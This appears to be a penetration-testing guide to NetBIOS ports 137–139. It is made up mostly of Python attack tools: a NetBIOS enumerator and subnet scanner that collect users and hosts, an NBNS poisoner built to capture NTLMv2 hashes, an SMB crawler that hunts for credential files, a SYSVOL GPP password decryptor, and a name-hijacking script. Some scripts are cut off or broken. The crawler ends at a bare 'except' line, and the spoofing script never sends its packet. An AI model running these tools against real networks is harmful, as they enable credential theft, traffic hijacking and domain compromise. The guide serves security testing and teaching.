## Overview

Ports **137**, **138**, and **139** run the **NetBIOS (Network Basic Input/Output System)** protocol suite — a legacy but still pervasive networking layer that provides name resolution, datagram distribution, and session services. On Windows networks, NetBIOS sits beneath SMB and is deeply integrated into Active Directory, file sharing, printer access, and Windows name resolution.

::callout{icon="i-lucide-skull" color="red"}
NetBIOS was designed in 1983 with **zero security**. No authentication on name registration, no encryption on sessions, broadcast-based name resolution trivially poisoned, null sessions exposing full domain enumeration, and SMB over NetBIOS (port 139) carrying decades of critical remote code execution vulnerabilities including **EternalBlue**. These ports are among the **highest-value targets** on any internal penetration test.
::

## Protocol Architecture

```
┌─────────────────────────────────────────────────────┐
│                  APPLICATION LAYER                   │
│          (File Sharing, Print, IPC, RPC)             │
├─────────────────────────────────────────────────────┤
│                      SMB / CIFS                      │
│           (Server Message Block Protocol)            │
├────────────┬────────────┬───────────────────────────┤
│  NetBIOS   │  NetBIOS   │     NetBIOS               │
│  Name      │  Datagram  │     Session               │
│  Service   │  Service   │     Service               │
│  UDP 137   │  UDP 138   │     TCP 139               │
├────────────┴────────────┴───────────────────────────┤
│              TCP/IP (or direct SMB on 445)           │
└─────────────────────────────────────────────────────┘
```

### NetBIOS Name Types

Every NetBIOS name is exactly **16 characters** — 15 user-defined + 1 suffix byte indicating the service type. The suffix is critical for enumeration.

| Suffix | Type | Name Type | Meaning |
| --- | --- | --- | --- |
| `<00>` | UNIQUE | Workstation | Computer name — machine is online |
| `<00>` | GROUP | Domain/Workgroup | Domain/workgroup membership |
| `<03>` | UNIQUE | Messenger | Logged-in username (message service) |
| `<06>` | UNIQUE | RAS Server | Remote Access Service server |
| `<1B>` | UNIQUE | Domain Master Browser | PDC / Domain Master Browser |
| `<1C>` | GROUP | Domain Controllers | All DCs for this domain |
| `<1D>` | UNIQUE | Master Browser | Local subnet master browser |
| `<1E>` | GROUP | Browser Election | Browser service election participant |
| `<20>` | UNIQUE | File Server | SMB/File sharing is active |
| `<21>` | UNIQUE | RAS Client | Remote Access Service client |

::tip
The `<03>` suffix reveals **logged-in usernames**. The `<1B>` suffix identifies the **PDC**. The `<1C>` suffix lists **all Domain Controllers**. The `<20>` suffix confirms **SMB file sharing** is running. All of this is queryable without authentication.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Scapy NBNS Query"}
  ```python [nbns_query.py]
  #!/usr/bin/env python3
  """
  NetBIOS Name Service query — equivalent to nbtstat -A.
  Returns: hostname, domain, logged-in users, services, MAC address.
  """

  from scapy.all import *
  import struct
  import sys

  TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.100"

  # NBNS Status Query (opcode 0x0021)
  # Transaction ID + Flags + Questions + etc
  nbns_status = (
      b'\x00\x01'     # Transaction ID
      b'\x00\x00'     # Flags: query
      b'\x00\x01'     # Questions: 1
      b'\x00\x00'     # Answers: 0
      b'\x00\x00'     # Authority: 0
      b'\x00\x00'     # Additional: 0
      # Name: * (wildcard CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)
      b'\x20'         # Name length
      b'CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  # Encoded '*'
      b'\x00'         # Name terminator
      b'\x00\x21'     # Type: NBSTAT
      b'\x00\x01'     # Class: IN
  )

  pkt = IP(dst=TARGET) / UDP(sport=RandShort(), dport=137) / \
        Raw(load=nbns_status)

  resp = sr1(pkt, timeout=3, verbose=0)

  if resp and resp.haslayer(Raw):
      data = bytes(resp[Raw].load)
      
      # Skip header (12 bytes) + question section
      offset = 12
      # Skip encoded name
      while offset < len(data) and data[offset] != 0:
          offset += 1
      offset += 5  # null + type(2) + class(2)
      
      # Answer section
      # Skip name pointer + type + class + TTL
      offset += 2 + 2 + 2 + 4
      
      # RDLENGTH
      if offset + 2 <= len(data):
          rdlength = struct.unpack('!H', data[offset:offset+2])[0]
          offset += 2
          
          # Number of names
          if offset < len(data):
              num_names = data[offset]
              offset += 1
              
              print(f"\n{'='*60}")
              print(f"NetBIOS Name Table for {TARGET}")
              print(f"{'='*60}")
              print(f"{'Name':<16} {'Suffix':<8} {'Type':<8} {'Flags'}")
              print(f"{'-'*16} {'-'*8} {'-'*8} {'-'*10}")
              
              for i in range(num_names):
                  if offset + 18 > len(data):
                      break
                  name = data[offset:offset+15].decode('ascii', errors='replace').strip()
                  suffix = data[offset+15]
                  flags = struct.unpack('!H', data[offset+16:offset+18])[0]
                  name_type = "GROUP" if flags & 0x8000 else "UNIQUE"
                  
                  # Decode suffix meaning
                  suffix_meaning = {
                      0x00: "Workstation" if name_type == "UNIQUE" else "Domain",
                      0x03: "Messenger (USER LOGGED IN)",
                      0x06: "RAS Server",
                      0x1B: "Domain Master Browser (PDC)",
                      0x1C: "Domain Controllers",
                      0x1D: "Master Browser",
                      0x1E: "Browser Election",
                      0x1F: "NetDDE",
                      0x20: "File Server (SMB)",
                      0x21: "RAS Client",
                      0xBE: "Network Monitor Agent",
                      0xBF: "Network Monitor App",
                  }.get(suffix, f"Unknown (0x{suffix:02x})")
                  
                  print(f"{name:<16} <{suffix:02x}>    {name_type:<8} {suffix_meaning}")
                  offset += 18
              
              # MAC address (6 bytes after names)
              if offset + 6 <= len(data):
                  mac = ':'.join(f'{data[offset+j]:02x}' for j in range(6))
                  print(f"\nMAC Address: {mac}")
              
              print(f"{'='*60}")
  else:
      print(f"[-] No response from {TARGET}")
  ```

  ```python [nbns_scanner.py]
  #!/usr/bin/env python3
  """
  Fast mass NetBIOS scanner — scan /24 in seconds.
  Extracts: hostname, domain, users, MAC, file server status.
  """

  from scapy.all import *
  import sys
  import struct
  from concurrent.futures import ThreadPoolExecutor

  SUBNET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0"

  # NBNS status query payload
  NBNS_QUERY = (
      b'\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
      b'\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00'
      b'\x00\x21\x00\x01'
  )

  def query_host(ip):
      try:
          pkt = IP(dst=ip) / UDP(sport=RandShort(), dport=137) / Raw(load=NBNS_QUERY)
          resp = sr1(pkt, timeout=2, verbose=0)
          
          if not resp or not resp.haslayer(Raw):
              return None
          
          data = bytes(resp[Raw].load)
          offset = 12
          while offset < len(data) and data[offset] != 0: offset += 1
          offset += 6  # skip null + type + class + answer pointer
          offset += 2 + 2 + 4  # type + class + TTL
          
          if offset + 2 > len(data): return None
          rdlength = struct.unpack('!H', data[offset:offset+2])[0]
          offset += 2
          
          if offset >= len(data): return None
          num_names = data[offset]; offset += 1
          
          result = {"ip": ip, "names": [], "hostname": "", "domain": "",
                   "users": [], "file_server": False, "mac": ""}
          
          for _ in range(num_names):
              if offset + 18 > len(data): break
              name = data[offset:offset+15].decode('ascii', errors='replace').strip()
              suffix = data[offset+15]
              flags = struct.unpack('!H', data[offset+16:offset+18])[0]
              is_group = bool(flags & 0x8000)
              
              if suffix == 0x00 and not is_group: result["hostname"] = name
              if suffix == 0x00 and is_group: result["domain"] = name
              if suffix == 0x03 and not is_group: result["users"].append(name)
              if suffix == 0x20: result["file_server"] = True
              
              result["names"].append((name, suffix, is_group))
              offset += 18
          
          if offset + 6 <= len(data):
              result["mac"] = ':'.join(f'{data[offset+j]:02x}' for j in range(6))
          
          return result
      except:
          return None

  print(f"{'IP':<16} {'Hostname':<16} {'Domain':<16} {'Users':<20} {'SMB':<5} {'MAC'}")
  print(f"{'-'*16} {'-'*16} {'-'*16} {'-'*20} {'-'*5} {'-'*17}")

  with ThreadPoolExecutor(max_workers=50) as executor:
      futures = {executor.submit(query_host, f"{SUBNET}.{i}"): i for i in range(1, 255)}
      for future in futures:
          r = future.result()
          if r:
              users = ','.join(r['users']) or '-'
              smb = '✓' if r['file_server'] else '-'
              print(f"{r['ip']:<16} {r['hostname']:<16} {r['domain']:<16} "
                    f"{users:<20} {smb:<5} {r['mac']}")
  ```

## Port 137 — NBNS Poisoning

NBNS poisoning intercepts name resolution queries on port 137 to capture NTLM authentication hashes.

### How NBNS Poisoning Works

```
  ┌──────────┐                              ┌──────────┐
  │  Victim  │  "Where is FILESHARE?"       │ Attacker │
  │          │ ─────── DNS fails ─────────► │          │
  │          │ ─────── LLMNR (5355) ──────► │ Responder│
  │          │ ─────── NBNS (137) ────────► │          │
  │          │                              │          │
  │          │  "FILESHARE is at 10.0.0.50" │          │
  │          │ ◄──────────────────────────── │          │
  │          │                              │          │
  │          │  SMB connect to 10.0.0.50    │          │
  │          │ ─────── NTLM auth ─────────► │          │
  │          │                              │ Captures │
  │          │                              │ NTLMv2   │
  │          │                              │ hash!    │
  └──────────┘                              └──────────┘
```

  :::tabs-item{icon="i-lucide-terminal" label="Scapy NBNS Poisoner"}
  ```python [nbns_poison.py]
  #!/usr/bin/env python3
  """
  Custom NBNS Poisoner — respond to all NBNS queries with attacker IP.
  More control than Responder — target specific names or hosts.
  """

  from scapy.all import *
  import struct

  IFACE = "eth0"
  ATTACKER_IP = "10.0.0.50"

  # Only poison these names (empty = poison everything)
  TARGET_NAMES = []
  # TARGET_NAMES = ["FILESRV", "PRINTSRV", "SQLSRV"]

  # Only poison queries from these MACs (empty = everyone)
  TARGET_MACS = []
  # TARGET_MACS = ["aa:bb:cc:dd:ee:ff"]

  def decode_netbios_name(encoded):
      """Decode NetBIOS encoded name"""
      decoded = ""
      for i in range(0, len(encoded), 2):
          if i + 1 < len(encoded):
              high = (encoded[i] - 0x41) << 4
              low = encoded[i+1] - 0x41
              char = chr(high | low)
              decoded += char
      return decoded.strip()

  def poison(pkt):
      if not (pkt.haslayer(UDP) and pkt[UDP].dport == 137):
          return
      if not pkt.haslayer(Raw):
          return

      data = bytes(pkt[Raw].load)
      if len(data) < 12:
          return

      # Check it's a query (not a response)
      flags = struct.unpack('!H', data[2:4])[0]
      if flags & 0x8000:  # Response bit set — skip
          return

      # Extract queried name
      if len(data) > 13:
          name_len = data[12]
          if name_len == 0x20 and len(data) > 13 + 32:
              encoded_name = data[13:13+32]
              queried_name = decode_netbios_name(encoded_name)

              # Target filtering
              if TARGET_NAMES and queried_name.strip() not in TARGET_NAMES:
                  return
              if TARGET_MACS and pkt[Ether].src.lower() not in \
                  [m.lower() for m in TARGET_MACS]:
                  return

              # Build NBNS response
              txid = data[0:2]
              ip_bytes = bytes(map(int, ATTACKER_IP.split('.')))

              response = (
                  txid +
                  b'\x85\x00'     # Flags: response, authoritative
                  b'\x00\x00'     # Questions: 0
                  b'\x00\x01'     # Answers: 1
                  b'\x00\x00'     # Authority: 0
                  b'\x00\x00'     # Additional: 0
              )
              # Answer section
              response += data[12:12+1+32+1]  # Copy name from query
              response += (
                  b'\x00\x20'     # Type: NB
                  b'\x00\x01'     # Class: IN
                  b'\x00\x00\x00\x00'  # TTL: 0
                  b'\x00\x06'     # RDLENGTH: 6
                  b'\x00\x00'     # Flags
              )
              response += ip_bytes  # Our IP

              reply = (
                  IP(src=ATTACKER_IP, dst=pkt[IP].src) /
                  UDP(sport=137, dport=pkt[UDP].sport) /
                  Raw(load=response)
              )

              send(reply, iface=IFACE, verbose=0)
              print(f"[+] Poisoned '{queried_name.strip()}' → {ATTACKER_IP}"
                    f"  (victim: {pkt[IP].src})")

  print("[*] NBNS Poisoner active — all queries resolve to us")
  sniff(iface=IFACE, filter="udp dst port 137", prn=poison, store=0)
  ```

  ```python [smb_file_hunter.py]
  #!/usr/bin/env python3
  """Hunt for sensitive files across SMB shares."""

  from impacket.smbconnection import SMBConnection
  import sys
  import re

  TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.100"
  USERNAME = ""
  PASSWORD = ""
  DOMAIN = ""

  INTERESTING = [
      r'password', r'passwd', r'credential', r'secret',
      r'\.kdbx$', r'\.key$', r'\.pfx$', r'\.p12$',
      r'\.rdp$', r'\.vnc$', r'\.config$', r'\.ini$',
      r'web\.config', r'unattend\.xml', r'sysprep',
      r'\.bak$', r'\.old$', r'\.sql$', r'\.mdb$',
      r'id_rsa', r'\.pem$', r'\.ppk$',
      r'ntds\.dit', r'sam$', r'system$',
  ]

  def search_share(conn, share):
      try:
          files = conn.listPath(share, '*')
          for f in files:
              name = f.get_longname()
              if name in ('.', '..'): continue
              for pattern in INTERESTING:
                  if re.search(pattern, name, re.IGNORECASE):
                      print(f"  [!] {share}/{name}  "
                            f"({'DIR' if f.is_directory() else f'{f.get_filesize()}B'})")
      except Exception as e:
          pass

  try:
      conn = SMBConnection(TARGET, TARGET, timeout=5)
      conn.login(USERNAME, PASSWORD, DOMAIN)
      
      shares = conn.listShares()
      for share in shares:
          name = share['shi1_netname'][:-1]
          print(f"\n[*] Scanning share: {name}")
          search_share(conn, name)
      
      conn.logoff()
  except Exception as e:
  ```

  ```python [gpp_finder.py]
  #!/usr/bin/env python3
  """Find and decrypt GPP passwords in SYSVOL."""

  from impacket.smbconnection import SMBConnection
  import xml.etree.ElementTree as ET
  from Crypto.Cipher import AES
  from base64 import b64decode
  import sys

  TARGET = sys.argv[1] if len(sys.argv) > 1 else "dc01.corp.local"

  # Microsoft published AES key for GPP
  GPP_KEY = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

  def decrypt_gpp(cpassword):
      pad = len(cpassword) % 4
      if pad: cpassword += "=" * (4 - pad)
      password = b64decode(cpassword)
      iv = b'\x00' * 16
      cipher = AES.new(GPP_KEY, AES.MODE_CBC, iv)
      decrypted = cipher.decrypt(password)
      return decrypted.decode('utf-16-le').rstrip('\x00').rstrip()

  try:
      conn = SMBConnection(TARGET, TARGET, timeout=5)
      conn.login('', '', '')
      
      def search_gpp(conn, share, path='*'):
          try:
              files = conn.listPath(share, path)
              for f in files:
                  name = f.get_longname()
                  if name in ('.', '..'): continue
                  full = path.replace('*', '') + name
                  
                  if f.is_directory():
                      search_gpp(conn, share, full + '/*')
                  elif name.endswith('.xml'):
                      try:
                          fh = conn.openFile(share, full)
                          data = b''
                          while True:
                              chunk = conn.readFile(share, fh, len(data), 4096)
                              if not chunk: break
                              data += chunk
                          conn.closeFile(share, fh)
                          
                          if b'cpassword' in data:
                              root = ET.fromstring(data)
                              for elem in root.iter():
                                  cp = elem.get('cpassword', '')
                                  user = elem.get('userName', '') or elem.get('runAs', '')
                                  if cp:
                                      decrypted = decrypt_gpp(cp)
                                      print(f"[!] FOUND GPP PASSWORD!")
                                      print(f"    File: {full}")
                                      print(f"    User: {user}")
                                      print(f"    Pass: {decrypted}")
                      except:
                          pass
          except:
              pass
      
      print(f"[*] Searching SYSVOL on {TARGET}...")
      search_gpp(conn, 'SYSVOL')
      conn.logoff()
  except Exception as e:
      print(f"[-] Error: {e}")
  ```

## NetBIOS Name Spoofing

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Name Registration Attack"}
  ```python [nbns_name_spoof.py]
  #!/usr/bin/env python3
  """
  NetBIOS Name Registration/Override attack.
  Register a name that already belongs to another host.
  Causes name conflicts and can redirect SMB connections.
  """

  from scapy.all import *
  import struct

  IFACE = "eth0"
  ATTACKER_IP = "10.0.0.50"
  TARGET_NAME = "FILESRV"        # Name to hijack

  def encode_netbios_name(name, suffix=0x20):
      """Encode NetBIOS name (first-level encoding)"""
      name = name.upper().ljust(15)
      encoded = ""
      for char in name:
          byte = ord(char)
          encoded += chr((byte >> 4) + 0x41)
          encoded += chr((byte & 0x0F) + 0x41)
      # Add suffix
      encoded += chr((suffix >> 4) + 0x41)
      encoded += chr((suffix & 0x0F) + 0x41)
      return encoded

  encoded = encode_netbios_name(TARGET_NAME, 0x20)

  # NBNS Registration (Overwrite) packet
  registration = (
      b'\x80\x01'     # Transaction ID
      b'\x29\x00'     # Flags: Registration, Broadcast, Recursive
      b'\x00\x01'     # Questions: 1
      b'\x00\x00'     # Answers: 0
      b'\x00\x00'     # Authority: 0
      b'\x00\x01'     # Additional: 1
  )
  # Question section
  registration += bytes([len(encoded)]) + encoded.encode() + b'\x00'
  registration += b'\x00\x20\x00\x01'  # Type NB, Class IN

  # Additional section (our registration)
  registration += bytes([len(encoded)]) + encoded.encode() + b'\x00'
  registration += b'\x00\x20\x00\x01'  # Type NB, Class IN
  ```
